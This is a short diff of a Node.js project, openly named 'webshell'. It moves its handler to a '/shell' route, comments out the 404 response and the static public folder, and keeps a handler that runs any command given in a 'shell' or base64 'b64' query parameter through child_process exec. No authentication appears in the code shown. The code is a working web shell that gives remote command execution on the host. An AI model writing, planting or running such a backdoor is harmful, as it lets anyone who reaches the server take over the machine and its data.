@@ -55,8 +55,8 @@ core.prototype.setPublic = function(path){
 
 core.prototype.request = (req, res, _this) => {
   var routeFunc = _this.routeRequest[req.pathname.toLowerCase()];
-  if(routeFunc===undefined&&_this.publicPath.length===0){
-    return res.end('404 not found');
+  if(routeFunc===undefined&&_this.publicPath===null){
+    //return res.end('404 not found');
   }else if(routeFunc!==undefined){
     return routeFunc(req, res);
   }else if(_this.publicPath.length){
@@ -81,14 +81,14 @@ const shell = require('child_process');
 
 var app = new core('webshell');
 
-app.setPublic(__dirname+'/public');
+//app.setPublic(__dirname+'/public');
 
 app.set((req, res, next)=>{
   console.log(req.method, req.url);
   next();
 });
 
-app.use('/', (req, res)=>{
+app.use('/shell', (req, res)=>{
   if(req.query.shell!=undefined||req.query.b64!=undefined){
     let b64 = Buffer.from(req.query.b64||'', 'base64').toString('ascii')
     shell.exec(req.query.shell||b64,function(error,stdout,stderr){
